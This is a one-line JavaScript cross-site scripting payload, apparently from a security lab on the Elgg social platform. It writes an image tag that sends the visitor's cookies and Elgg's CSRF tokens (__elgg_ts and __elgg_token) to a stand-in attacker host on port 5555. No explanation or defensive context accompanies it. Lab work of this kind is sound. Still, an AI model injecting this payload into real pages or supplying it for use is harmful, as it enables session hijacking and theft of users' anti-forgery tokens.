document.write('<img src=http://www.atacker.com:5555?c=' + escape(document.cookie) +  '&ts=' + escape(elgg.security.token.__elgg_ts) + '&token=' + escape(elgg.security.token.__elgg_token) +' >');

